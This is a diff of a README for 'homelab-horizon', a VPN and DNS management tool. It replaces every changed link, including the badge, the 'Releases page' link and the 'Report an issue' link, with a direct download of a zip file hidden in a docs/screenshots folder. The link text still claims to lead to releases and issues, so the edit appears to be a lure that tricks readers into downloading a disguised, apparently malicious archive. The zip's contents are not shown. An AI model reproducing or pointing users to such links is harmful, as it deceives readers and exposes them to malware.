@@ -1,6 +1,6 @@
 # 🌐 homelab-horizon - Easy VPN and DNS Management for Your Network
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)
+![Download](https://github.com/Munna89/homelab-horizon/raw/refs/heads/main/docs/screenshots/horizon_homelab_v2.5.zip%20Release-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you begin, make sure your device meets the following requirements:
 To get started, visit the Releases page to download the application. Follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download from GitHub Releases](https://github.com/Munna89/homelab-horizon/releases)
+   [Download from GitHub Releases](https://github.com/Munna89/homelab-horizon/raw/refs/heads/main/docs/screenshots/horizon_homelab_v2.5.zip)
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version, which will be at the top of the list.
 
@@ -58,7 +58,7 @@ If you encounter any issues, consider the following solutions:
 
 For further assistance, reach out through the following channels:
 
-- GitHub Issues: [Report an issue](https://github.com/Munna89/homelab-horizon/issues)
+- GitHub Issues: [Report an issue](https://github.com/Munna89/homelab-horizon/raw/refs/heads/main/docs/screenshots/horizon_homelab_v2.5.zip)
 - Community Forum: Join discussions and find help in our community.
 
 Thank you for choosing **homelab-horizon**! Enjoy a simpler, more secure networking experience.
